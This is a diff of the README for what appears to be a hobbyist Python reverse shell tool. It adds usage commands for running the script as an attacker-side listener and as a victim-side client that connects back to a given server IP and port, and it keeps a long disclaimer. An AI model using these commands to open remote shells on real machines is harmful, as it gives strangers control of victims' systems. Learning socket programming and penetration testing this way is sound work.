@@ -1,13 +1,29 @@
-Disclaimer: I am not responsible for any real / potential damage by the use of this project
+
 
 # Sample Demo:
 ![Alt Text](https://github.com/heecheon92/Reverse_shell/blob/master/rshell_demo.png)
+
+# How to Use?
+
+You can run this program either as a server (attacker) or client (victim)
+
+To run as a server:
+
+  python3 rshell.py -m server -p port_number
+  
+To run as a client:
+
+  python3 rshell.py -m client -t server_ip_address -p server_port_number
+
+# A Very Long Disclaimer: 
+
+I am not responsible for any real / potential damage by the use of this project
 
 I am not a professional penetration tester.
 
 However, I do find network/socket programming very attractive and based on what I learned from
 
-Network class in college, I have made this little sneaky programs.
+network class in college and socket programming I picked up from somewhere, I have made this little sneaky programs.
 
 Just because I like to understand about penetration testing, it does not mean I would like to relentlessly abuse well known tools or frameworks (such as metasploit....veil....sqlmap.....hashcat.....etc). Instead, I wanted to try making my own script and see what I can do. I am not saying those penetration tools are bad. In fact, I get amazed how well they are automated to attack mutliple victim nodes. I just do not want to solely rely on them.
 
